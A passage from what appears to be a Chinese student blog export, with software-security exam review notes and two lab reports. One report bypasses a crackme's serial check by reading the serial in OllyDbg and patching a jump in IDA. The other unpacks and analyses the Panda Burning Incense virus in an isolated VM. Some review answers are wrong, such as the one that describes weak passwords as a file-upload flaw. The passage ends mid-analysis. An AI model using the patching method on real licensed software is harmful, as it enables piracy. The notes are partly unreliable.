<li>Web客户端<ul>
<li><strong>XSS</strong>（跨站脚本攻击）：Web页面插入恶意js代码，浏览网页的时候执行攻击；</li>
<li><strong>CSRF</strong>（跨站请求伪造）：获取用户信息（cookie）伪造请求，利用身份攻击；</li>
</ul>
</li>
<li>Web服务端<ul>
<li><strong>Sql注入</strong>：恶意数据插入sql查询，提交后进行非授权操作；</li>
<li><strong>弱口令</strong>：文件上传中，没有验证后缀，上传恶意文件后远程控制服务器；</li>
<li><strong>未加密</strong>：用户名密码等字段不加密，被窃听截获；</li>
</ul>
</li>
</ul>
<ol start="5">
<li>简述SQL注入漏洞的原理？为什么SQL注入漏洞多年来一直名列Web安全漏洞榜首？</li>
</ol>
<ul>
<li>原理：利用Web应用程序，恶意数据插入SQL查询，提交到后台数据库执行非授权操作。</li>
<li>危害：<ul>
<li><strong>广泛性</strong>，基于SQL的数据库软件和相连的程序；</li>
<li><strong>原理简单</strong>，教程多；</li>
<li><strong>防范困难；</strong></li>
</ul>
</li>
</ul>
<ol start="6">
<li><p>防范SQL注入漏洞的基本方法有哪些？重点谈谈在代码开发层面的安全措施。</p>
<ul>
<li>使用<strong>强类型语言</strong>，java，C#；</li>
<li>避免使用拼接动态SQL语句，采用参数化查询接口；</li>
<li>服务端<strong>验证输入，过滤错误输入</strong>；</li>
</ul>
</li>
<li><p>什么是SQL盲注？与一般的SQL注入有什么区别？</p>
</li>
</ol>
<ul>
<li>盲注：在sql注入过程中，sql执行完的数据不返回前端，此时要利用特定方法判断。</li>
<li>一般SQL注入，攻击者看到执行结果；盲注，攻击者无法显式看到，甚至不知道是否执行。</li>
</ul>
<ol start="8">
<li>简述XSS跨站脚本漏洞的原理。</li>
</ol>
<ul>
<li>Web页面插入恶意js代码，浏览网页的时候执行攻击。</li>
</ul>
<ol start="9">
<li>简述CSRF跨站请求伪造漏洞的原理，并比较其与XSS漏洞的不同。</li>
</ol>
<ul>
<li>获取用户信息（cookie）伪造请求，利用身份攻击应用程序；</li>
<li>XSS目的是在<strong>客户端执行脚本</strong>，CSRF目的是在<strong>web应用中</strong>执行操作；</li>
</ul>
<ol start="10">
<li>什么是命令执行漏洞？什么是文件包含漏洞？什么是文件上传漏洞？</li>
</ol>
<ul>
<li>命令执行漏洞：将恶意代码提交给服务器，执行系统命令；</li>
<li>文件包含漏洞：注入一段脚本或代码，让服务器执行；</li>
<li>文件上传漏洞：用户上传可执行脚本文件，获得服务器执行能力；</li>
</ul>
<h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><ol>
<li>什么是软件生命周期？包含哪几个阶段？</li>
</ol>
<ul>
<li>软件的设计、开发、实施、维护等一系列过程；</li>
<li>软件需求分析、软件设计、软件编码、软件测试、软件部署、维护等阶段；</li>
</ul>
<ol start="2">
<li>典型的软件开发模型？有什么区别与联系？</li>
</ol>
<ul>
<li>瀑布模型、螺旋模型、敏捷模型；</li>
<li>联系：都是软件开发模型；</li>
<li>区别：迭代次数与时机不同，开发时间要求不同；</li>
</ul>
<ol start="3">
<li><strong>SDL+C原则是SDL模型实施的基本原则，试简述其内容。</strong></li>
</ol>
<ul>
<li>安全设计（Security by Design）：软件设计需考虑保护自己不受攻击；</li>
<li>安全配置（Security by Default）：软件配置应该考虑降低安全风险；</li>
<li>安全部署（Security by Deployment）：需提供文档和工具帮助用户安全使用；</li>
<li>沟通（Communication）软件开发人员应与各类人员进行沟通；</li>
</ul>
<ol start="4">
<li>微软的SDL模型与传统的瀑布模型的关系是怎样的？</li>
</ol>
<ul>
<li>SDL模型由瀑布模型发展而来，在瀑布模型的各个阶段添加了<strong>安全活动和业务活动</strong>目标。</li>
</ul>
<h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><ol>
<li>为什么要进行安全需求分析？通常对软件系统有哪些安全需求？</li>
</ol>
<ul>
<li>目的：为了实现信息安全目标，软件系统应该做什么，才能有效提高软件产品的安全质量，减少漏洞。</li>
<li>外部安全需求：法律法规等遵从性需求。</li>
<li>内部安全需求：组织内部需要遵守的规则；与软件业务功能相关的安全需求。</li>
</ul>
<ol start="2">
<li><strong>软件安全需求分析的主要工作是什么？它和软件需求分析有什么区别和联系？</strong></li>
</ol>
<ul>
<li>主要工作：识别、确定、追踪和协调软件项目中涉及安全相关的功能性需求。</li>
<li>区别：<ul>
<li>需要安全知识；</li>
<li>要考虑不同的安全攻击和防御；</li>
<li>核心是安全需求｜核心是功能性需求；</li>
</ul>
</li>
<li>联系：<ul>
<li>是软件需求分析的<strong>衍生；</strong></li>
<li>以功能性需求分析为<strong>基础</strong>，重点关注安全方面；</li>
<li>从<strong>安全角度</strong>考虑系统需求，提供更好保护；</li>
</ul>
</li>
</ul>
<ol start="3">
<li>网络安全等级保护制度分为哪些等级？每级都有什么要求？</li>
</ol>
<ul>
<li>第一级，属于一般网络，一旦遭受破坏，公民，法人和其他组织。</li>
<li>第二级，属于一般网络，一旦遭受破坏，公法组，社会秩序和公共利益。</li>
<li>第三级，属于重要网络，一旦遭受破坏，公法组，社会，国家安全。</li>
<li>第四级，属于特别重要网络，一旦遭受破坏，社会！，国安！</li>
<li>第五级，属于极其重要网络，一旦遭受破坏，国安！！！</li>
</ul>
<ol start="4">
<li>软件安全需求的获取方式有哪些？</li>
</ol>
<ul>
<li>头脑风暴：无限制的自由联想和讨论；</li>
<li>问卷调查和访谈；</li>
<li>政策分解：将组织需要遵守的内部和外部政策分解成详细的安全需求；</li>
<li>数据分类：根据数据重要性分类，也就是敏感级别；</li>
<li>主&#x2F;客体关系矩阵：角色和组件的二维表示；</li>
</ul>
<h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><ol>
<li><strong>软件设计阶段的主要工作是什么？</strong></li>
</ol>
<ul>
<li>定义数据结构、算法确定、架构设计、接口设计、模块分解、数据库设计等。</li>
</ul>
<ol start="2">
<li><strong>软件安全设计阶段的主要工作是什么？</strong></li>
</ol>
<ul>
<li>分析安全需求</li>
<li>系统功能设计</li>
<li>安全架构设计</li>
<li>安全功能实现</li>
<li>系统测试</li>
<li>安全文档编写</li>
</ul>
<ol start="3">
<li><strong>什么是最小授权原则？试举例说明软件设计时哪些措施是采用了最小授权原则。</strong></li>
</ol>
<ul>
<li>最小授权原则：系统仅授予实体完成规定任务所必需的<strong>最小权限</strong>，持续<strong>时间也尽量短</strong>。最小授权原则可使无意识的、不需要的、不正确的特权使用可能性降到最低，<strong>保证安全</strong>。</li>
<li>实例：将超级用户的权限划分为一组细粒度权限，分别授予不同的系统操作员&#x2F;管理员。</li>
</ul>
<ol start="4">
<li><strong>什么是权限分离原则？试举例说明软件设计时哪些措施是采用了权限分离原则。</strong></li>
</ol>
<ul>
<li>权限分离原则：功能设计为需要两个或以上条件才能实现，防止出问题。是最小权限原则的体现。</li>
<li>实例：导弹发射要由至少两个人发出正确指令才能发射，不允许程序员检查自己的代码。</li>
</ul>
<h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><ol>
<li><strong>软件安全编码阶段的主要工作有哪些？</strong></li>
</ol>
<ul>
<li>选择安全的编程语言、版本（配置）管理、代码检测、安全编译</li>
</ul>
<ol start="2">
<li>什么是类型安全语言？哪些程序开发语言是类型安全的？</li>
</ol>
<ul>
<li>提供类型安全保障机制的语言是类型安全语言，本质上是不允许对未授权的内存区域访问。</li>
<li>Java，C#。</li>
</ul>
<ol start="3">
<li><strong>试列举几条安全编码原则，并举例说明这些原则的重要意义。</strong></li>
</ol>
<ul>
<li>验证输入：对于不可信任的数据源输入进行验证；</li>
<li>留意编译器警告：不仅解决代码中错误，也解决所有警告；</li>
<li>安全策略的架构和设计：创建一个软件架构来实现和增强安全策略；</li>
<li>保持简单性：程序越复杂，越容易出错；</li>
<li>默认拒绝：访问权限默认拒绝，除非被允许；</li>
<li>坚持最小权限原则；</li>
</ul>
<ol start="4">
<li>为什么要避免使用C语言中原有的字符串函数？所谓的安全字符串函数解决了原有C字符串函数的什么安全漏洞？</li>
</ol>
<ul>
<li>C语言原有的字符串函数有可能破坏接受字符串的缓冲区，导致程序出错或者数据丢失。</li>
<li>会检查字符串的长度，用空格截断字符串，或扩充缓冲区大小，保证数据完整性。</li>
</ul>
<ol start="5">
<li>Java沙箱安全机制的核心思想是什么？</li>
</ol>
<ul>
<li>控制访问权限，远程下载的程序只能访问“沙箱”中有限的资源。</li>
</ul>
<ol start="6">
<li>试谈谈Java提供的安全机制。</li>
</ol>
<ul>
<li>语言层安全（关键字、类型规则）；</li>
<li>字节码层安全（类加载器，字节码验证器）；</li>
<li>应用层安全（安全管理器）；</li>
</ul>
<h2 id="第十二章"><a href="#第十二章" class="headerlink" title="第十二章"></a>第十二章</h2><ol>
<li>从危害、传播、激活和隐藏4个主要方面分析计算机病毒、蠕虫、木马、后门、Rookit及勒索软件这几类恶意代码类型的工作原理。</li>
</ol>
<ul>
<li><table>
<thead>
<tr>
<th></th>
<th>病毒</th>
<th>蠕虫</th>
<th>木马</th>
<th>后门</th>
<th>Rookit</th>
<th>勒索软件</th>
</tr>
</thead>
<tbody><tr>
<td>危害</td>
<td>破坏系统机密性、完整性、可用性</td>
<td>网络堵塞；降低性能；反复性</td>
<td>非法用户进入、控制、破坏系统</td>
<td>一个访问系统或控制系统的通道</td>
<td>攻击者获得访问权限</td>
<td>劫持用户资产或资源并勒索</td>
</tr>
<tr>
<td>传播</td>
<td>移动存储&#x2F;网络</td>
<td>自我复制&#x2F;局域网</td>
<td>诱骗用户上当，植入</td>
<td></td>
<td></td>
<td>垃圾邮件、漏洞、社交网络等</td>
</tr>
<tr>
<td>激活</td>
<td>满足特定条件</td>
<td>自动化，利用系统漏洞</td>
<td>用户操作</td>
<td>用户操作</td>
<td>开发者调试</td>
<td></td>
</tr>
<tr>
<td>隐藏</td>
<td>寄生在别的有用的程序或文档上</td>
<td>实体隐藏模块</td>
<td>难以确定具体位置</td>
<td></td>
<td>修改操作系统软件</td>
<td></td>
</tr>
<tr>
<td>例子</td>
<td>区块链病毒</td>
<td>熊猫烧香</td>
<td>灰鸽子</td>
<td>硅晶后门</td>
<td>震网病毒</td>
<td>ILOVEYOU爱虫病毒</td>
</tr>
</tbody></table>
</li>
</ul>
<ol start="2">
<li><strong>病毒程序与蠕虫程序的主要区别有哪些？</strong></li>
</ol>
<ul>
<li>漏洞利用型蠕虫与病毒根本区别在于其是否需要人为干预来触发传播，而在很多其他方面，例如个体独立性、破坏性、隐藏性等，二者区别并不大。</li>
<li>计算机病毒的关键技术是伪装，通过诱导、欺骗用户的手段引导用户的误操作从而实现感染，用户的行为直接决定病毒的感染是否成功。</li>
<li>蠕虫在其感染过程中并不需要用户的主动行为，其感染过程是一种自动化、智能化的过程。</li>
<li>蠕虫的重要特征：对用户的非依赖性。而实现这一功能的基础便是系统漏洞</li>
</ul>
<ol start="3">
<li><strong>恶意代码防范的基本措施包括哪些？</strong></li>
</ol>
<ul>
<li>加强法制宣传；</li>
<li>健全管理制度；</li>
<li>开展面向恶意代码检测的软件可信验证；</li>
</ul>
<h2 id="第十三章"><a href="#第十三章" class="headerlink" title="第十三章"></a>第十三章</h2><ol>
<li><p>试从软件的权益处置角度，谈谈对商业软件、免费软件、共享软件（或试用软件）、闭源软件、自由软件以及开源软件概念的理解。</p>
<ul>
<li>商业软件：商业软件是作为商品进行销售获得收益的软件；</li>
<li>免费软件：不需要以金钱购买而免费得到或试用的软件；</li>
<li>共享软件（试用软件）：以“先试用后付费”的方式销售的享有版权的软件；</li>
<li>闭源软件（专有软件）：源代码在获取、使用和修改上收到特定限制的软件，简单地说就是封闭源代码的软件；</li>
<li>自由软件：自由软件是一类可以不受限制地自由使用、复制、研究、修改和分发的软件；</li>
<li>开源软件：开放源代码、且许可证符合OSI对开源软件的定义并通过OSI认证的软件；</li>
</ul>
</li>
<li><p>自由软件赋予软件使用者哪些“自由”？</p>
<ol>
<li>不论目的如何，有运行（Run）该软件的自由；</li>
<li>有研究（Study）该软件的自由，以及按需改写该软件的自由；</li>
<li>有重新发布（Redistribute）该软件的自由；</li>
<li>有改进（Improve）该软件的自由，以及向公众发布（Release）改写版的自由；</li>
</ol>
</li>
<li><p>简述开源软件与自由软件的联系与区别。</p>
<ul>
<li>概念不同：自由软件是一个比开源软件更严格的概念，因此所有自由软件都是开放源代码的，但不是所有的开源软件都能被称为自由软件。</li>
<li>价值观不同：在追求自由、分享精神的过程中，自由软件始终将自由作为道德标准，而开源软件则更加注重软件的发展。自由软件从许可证即法律角度保证了自由软件在演化过程中将始终保持其“自由性”，从而保证其任何版本都可以为任何人使用、学习和改进，开源软件则更加注重与软件产业的结合，对商业化更加友好。</li>
</ul>
</li>
<li><p>列举常见的开源软件，查找并了解这些开源软件的许可证内容。</p>
<ul>
<li><strong>Linux内核</strong><ul>
<li><strong>许可证</strong>: <strong>GPL v2</strong></li>
<li><strong>概述</strong>: 任何基于Linux内核的修改或衍生作品必须开源且免费，并且继续保持GPL v2许可证。</li>
</ul>
</li>
<li><strong>Apache HTTP Server</strong><ul>
<li><strong>许可证</strong>: <strong>Apache License 2.0</strong></li>
<li><strong>概述</strong>: 允许用户自由使用、修改、分发代码，无需公开源代码，包括专利许可，需要注明修改内容。</li>
</ul>
</li>
<li><strong>Vue.js</strong><ul>
<li><strong>许可证</strong>：<strong>MIT License</strong></li>
<li><strong>概述</strong>：允许几乎任何行为，只需保留原始的版权声明和许可证。没有明确的专利许可。</li>
</ul>
</li>
</ul>
</li>
<li><p>所开发的软件中使用了带GPL许可证的开源软件，那么这个软件是不是就要开源？</p>
<ul>
<li>不是。GPL规定只要在一个软件中使用了GPL许可证产品，则该软件产品必须也采用GPL许可证，即必须也是开源和免费的。但是，如果用户（包括企业用户）对于GPL软件不再发布，就不受此约束。</li>
</ul>
</li>
</ol>
<h2 id="第十四章"><a href="#第十四章" class="headerlink" title="第十四章"></a>第十四章</h2><ul>
<li><p><strong>根据我国法律，软件著作权人有哪些权利？在日常学习和生活中，有哪些违反软件著作权的行为？</strong></p>
<ul>
<li>权利：<ul>
<li>发表权，署名权，修改权，保护作品完整权，复制权；</li>
</ul>
</li>
<li>侵权行为：<ul>
<li>剽窃，非法复制，擅自使用，擅自许可他人使用，擅自转让，合作&#x3D;&gt;自己；</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>试述软件版权的概念。针对软件的版权，有哪些侵权行为？有哪些保护措施？</strong></p>
<ul>
<li>概念：软件版权是软件知识产权的一部分，指软件著作权；</li>
<li>侵权行为：软件盗版；逆向工程；信息泄露；</li>
<li>保护措施：<ul>
<li>基于硬件：软件狗，对发行介质进行保护；</li>
<li>基于软件：软件水印，注册验证，软件加壳，虚拟机保护；</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>软件版权保护的目标有哪些？它与软件保护的目标有什么联系与区别？</strong></p>
<ul>
<li>目标：<ul>
<li>防软件盗版；</li>
<li>防逆向工程；</li>
<li>防信息泄露；</li>
</ul>
</li>
<li>区别与联系：<ul>
<li>软件版权保护目标是软件保护目标的<strong>子集</strong>。</li>
<li>软件版权保护的许多<strong>措施</strong>同样可以用于软件保护。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>本期末复习转自 Chipsy 和 Effy 。</li>
</ul>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验四——实验报告</title>
    <url>/2024/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%E2%80%94%E2%80%94%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>下载Crackme程序，综合运用0lyDbg、IDA 和UltraEdit 等工具进行注册登录功能的破解。完成实验报告，</p>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>破解目标选择 <strong>crakeme001：Acid burn</strong>；</p>
<p>实验环境为 windows 11.</p>
<h4 id="一-体验-Acid-burn"><a href="#一-体验-Acid-burn" class="headerlink" title="一 体验 Acid burn"></a>一 体验 Acid burn</h4><p>打开Acid burn，体验如何使用：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218194522553.png" alt="image-20241218194522553" style="zoom:50%;" />

<p>Serial&#x2F;Name界面，输入一个用户名，尝试输入几个序列号，都返回Try Aagin：</p>
<span id="more"></span>

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218194643402.png" alt="image-20241218194643402" style="zoom:50%;" />

<p>Serial界面同样：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218194738749.png" alt="image-20241218194738749" style="zoom: 67%;" />

<p>目标应该就是破解出正确的序列号了。</p>
<h4 id="二-ollyDbg-破解序列号"><a href="#二-ollyDbg-破解序列号" class="headerlink" title="二 ollyDbg 破解序列号"></a>二 ollyDbg 破解序列号</h4><ol>
<li><p>启动ollyDbg，打开acid burn文件：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218195018637.png" alt="image-20241218195018637" style="zoom: 50%;" />

<p>看到一大串类似于汇编语言的代码。</p>
<p>点击运行，然后在acid burn输入账号和序列号：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241219140833879.png" alt="image-20241219140833879"></p>
<p>发现定位到了0042FB03，这里有一个JNZ跳转指令<code>JNZ SHORT 0042FB1F</code>，根据ZF是否为0决定是否跳转。不跳转就往下执行，输出”Congratz !!”和“Good job dude &#x3D;)”字符串，否则会跳转到0042FB1F，即输出”Try Again！“和”Sorry，The serial is incorrect.“字符串。在JNZ跳转指令前面，有一段调用函数指令<code>CALL 004039FC</code>，那这个函数应该就是用来判等的。</p>
<p>同时右下方出现了一些字符串，立马发现我们在acid burn输入的账号”jinqq“和序列号”12345“，同时下面还有一个字符串”CW-8692-CRACKED“，如果是通过是否相等来判断的话，合理怀疑这串就是正确的序列号。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/cdd38434345eea8a37c7bbd2958a86c0.png" alt="cdd38434345eea8a37c7bbd2958a86c0"></p>
<p>测试一下，果然是这个：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241219143517968.png" alt="image-20241219143517968" style="zoom:67%;" /></li>
</ol>
<h4 id="三-IDA-破解-强制跳转”Good-job”"><a href="#三-IDA-破解-强制跳转”Good-job”" class="headerlink" title="三 IDA 破解 强制跳转”Good job”"></a>三 IDA 破解 强制跳转”Good job”</h4><p>先在IDA官网注册账号：<a href="https://hex-rays.com/ida-free">IDA Free</a>，下载IDA FREE 9.0并获取License Key。然后安装IDA，并在安装目录下放置下载的License Key。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220134000780.png" alt="image-20241220134000780" style="zoom:50%;" />

<p>用IDA打开acid burn，进入界面，包含反汇编视图、函数窗口、输出窗口：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220134153438.png" alt="image-20241220134153438"></p>
<p>通过搜索 “Sorry”，定位到这里。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220142727952.png" alt="image-20241220142727952"></p>
<p>可以看到，在 “Sorry” 代码块的前面就是 “Good job dude &#x3D;)” 代码块，并且前面有一个跳转指令<code>jnz short loc_42FB1F</code>，前面有一个call函数，应该是用来判等的，然后根据ZF为0还是为1来决定是否跳转。</p>
<p>我们希望它不进行跳转，执行下面的 “Good job dude &#x3D;)” 分支，因此将这一行换成无意义的一行。</p>
<p>选择<code>jnz short loc_42FB1F</code>这一行，再点击菜单栏 Edit &gt; Patch Program &gt; Assemble，然后将该行改成<code>nop</code>，确定。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220140534948.png" alt="image-20241220140534948" style="zoom:50%;" />

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220143414725.png" alt="image-20241220143414725"></p>
<p>然后再将修改的保存：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220141515934.png" alt="image-20241220141515934"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220141614547.png" alt="image-20241220141614547"></p>
<p>重新运行acid burn，发现成功：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220143609733.png" alt="image-20241220143609733"></p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>ollyDbg</tag>
        <tag>IDA</tag>
        <tag>crakeme</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验五——实验报告</title>
    <url>/2024/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%E2%80%94%E2%80%94%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>操作实验：熊猫烧香病毒分析。实验内容如下。</p>
<ol>
<li>基于虚拟机软件及其快照功能，搭建一个恶意代码分析实验环境。</li>
<li>分析熊猫烧香病毒的程序结构和入侵过程。</li>
</ol>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="一-搭建恶意代码分析实验环境"><a href="#一-搭建恶意代码分析实验环境" class="headerlink" title="一 搭建恶意代码分析实验环境"></a>一 搭建恶意代码分析实验环境</h4><p>测试环境：VMWare WorkStation + Windowx XP Home Edition</p>
<ol>
<li><p>通过共享文件夹，将病毒样本zip和所需工具上传到windows xp中，然后禁用共享文件夹。</p>
</li>
<li><p>关闭虚拟机的网络，防止病毒通过网络传播：</p>
</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220150624994.png" alt="image-20241220150624994" style="zoom:50%;" />

<span id="more"></span>

<ol start="3">
<li><p>关闭虚拟机的防火墙；</p>
</li>
<li><p>创建虚拟机快照，作为还原点：</p>
</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220150743736.png" alt="image-20241220150743736" style="zoom:50%;" />

<ol start="5">
<li>解压熊猫烧香.zip，释放病毒，病毒样本：</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220151151877.png" alt="image-20241220151151877" style="zoom:50%;" />

<h4 id="二-行为分析"><a href="#二-行为分析" class="headerlink" title="二 行为分析"></a>二 行为分析</h4><p>运行病毒，进程中出现<code>spo0lsv.ext</code>进程。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220152350781.png" alt="image-20241220152350781"></p>
<p>提取样本，放入火绒剑进行监控分析。</p>
<ol>
<li>发现文件创建、写入、修改、修改权限等操作，创建了大量Desktop_.ini文件：</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220152607275.png" alt="image-20241220152607275"></p>
<p>表现为大量感染系统中的exe文件：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220153520361.png" alt="image-20241220153520361"></p>
<ol start="2">
<li>发现有注册表操作，包括设置启动项、隐藏文件等：</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220152843889.png" alt="image-20241220152843889"></p>
<ol start="3">
<li>发现进程操作：</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220153006063.png" alt="image-20241220153006063"></p>
<ol start="4">
<li>发现网络操作：</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220153125920.png" alt="image-20241220153125920"></p>
<p><strong>总结：</strong></p>
<ol>
<li><p><strong>文件操作</strong>：病毒创建大量 Desktop_.ini 文件，感染系统中的 .exe 文件，导致文件无法正常运行并显示熊猫图标。</p>
</li>
<li><p><strong>注册表操作</strong>：修改注册表设置自启动项，并隐藏恶意文件，确保病毒在每次启动后重新运行。</p>
</li>
<li><p><strong>进程操作</strong>：创建或修改进程，保持病毒在系统中的存在，同时影响其他进程。</p>
</li>
<li><p><strong>网络操作</strong>：病毒与外部服务器通信，可能用于远程控制或数据窃取。</p>
</li>
</ol>
<h4 id="三-代码分析"><a href="#三-代码分析" class="headerlink" title="三 代码分析"></a>三 代码分析</h4><p>使用PEID进行查壳，发现程序带PSG 2.0壳。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220154321515.png" alt="image-20241220154321515" style="zoom:50%;" />

<p>使用ollydbg进行脱壳，单步跟踪，0x0040D278为程序的原始入口点，在该地址处，右键dump程序。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220155422697.png" alt="image-20241220155422697" style="zoom:50%;" />

<p>使用ImportRCE对dump文件进行IAT修复，发现不能完整识别所有的导入函数，观察IAT的起点是0x0041012C</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220155532102.png" alt="image-20241220155532102" style="zoom:50%;" />

<p>发现模块之间被 7FFFFFFF 填充，修改为00000000，从而清理掉这些无效数据，修复完成。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241220155742962.png" alt="image-20241220155742962"></p>
<p>修复完成后的dump文件用IDA打开</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163023845.png" alt="image-20241223163023845"></p>
<p>添加签名便于分析，搜索Delphi，找到Delphi6-7的特征库，应用可以识别出很多库函数</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163045453.png" alt="image-20241223163045453"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163101110.png" alt="image-20241223163101110"></p>
<p>使用F5将其转换为伪代码，便于后续分析。</p>
<p>从start处开始，先分析第一个函数sub_405205。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163122027.png" alt="image-20241223163122027"></p>
<p>回到OllyDBG，进入该函数：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163621592.png" alt="image-20241223163621592"></p>
<p>结合IDA中代码：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163650603.png" alt="image-20241223163650603"></p>
<p>在调用sub_405250之后，有LStrCmp字符串比较函数的调用，之后又有判断返回值的代码，可以猜测函数sub_405250应该是解密字符串函数。我们可以在IDA中改一下他的名字：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163730004.png" alt="image-20241223163730004"></p>
<p>剩下的sub_40819C、sub_40D18C、sub_40D088三个函数应该是执行恶意代码的函数，最后有一个消息循环，猜测是要等待恶意代码执行完毕以后退出：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223163751690.png" alt="image-20241223163751690"></p>
<h4 id="1-sub-40819C函数分析"><a href="#1-sub-40819C函数分析" class="headerlink" title="1. sub_40819C函数分析"></a>1. sub_40819C函数分析</h4><p>发现是在每一个目录下创建<code>Desktop_.ini</code>文件</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG327.jpg" alt="WechatIMG327"></p>
<p>继续往下走：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG328.jpg" alt="WechatIMG328"></p>
<p>首先4053AC函数的功能是获取Windows系统目录(System目录)的完整路径名。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG329.jpg" alt="WechatIMG329"></p>
<p>405FC4函数在IDA中不易分析，回到OllyDBG中，找到具体使用的地方：</p>
<p>发现此是EAX中存储的是病毒程序的名称。</p>
<p>找到调用该函数的位置，进入下一步后，发现返回了1，判断此处功能应该是结束程序名为”spo0lsv.exe”的程序。</p>
<p>继续往下，sub_407B68函数内为写入bat批处理文件的操作以及启动未被感染的程序。</p>
<p>继续分析，这段代码是用于判断当前是否为源病毒程序，如果是则进入判断语句，不是则结束进程。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG334.jpg" alt="WechatIMG334"></p>
<p><strong>汇总</strong></p>
<ul>
<li>sub_4053AC：获取Windows系统目录(System目录)的完整路径名；</li>
<li>sub_405FC4：结束程序名为”spo0lsv.exe”的程序；</li>
<li>sub_407B68：写入bat批处理文件的操作以及启动未被感染的程序；</li>
</ul>
<h4 id="2-sub-40D18C函数分析"><a href="#2-sub-40D18C函数分析" class="headerlink" title="2. sub_40D18C函数分析"></a>2. sub_40D18C函数分析</h4><p>发现包含这些函数：</p>
